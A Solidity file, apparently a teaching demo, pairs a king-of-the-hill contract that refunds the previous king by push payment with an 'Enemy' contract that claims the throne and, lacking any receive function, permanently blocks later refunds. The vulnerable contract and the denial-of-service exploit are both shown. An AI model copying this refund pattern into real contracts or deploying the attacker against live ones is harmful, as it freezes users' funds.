// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract BeTheKing{
    address payable  public   king;
    uint256 public balance;

    function claimTheThrone()public payable {
        require(msg.value > balance,"less amount");

        (bool success,)= king.call{value:balance}("");
        require(success,"failed");
        king = payable(msg.sender);
        balance = msg.value;
    }

}

contract Enemy{
    BeTheKing public beking;

    constructor(address _Beking){
        beking = BeTheKing(_Beking);
    }

    function attack()public payable{
        beking.claimTheThrone{value:msg.value}();
    }
}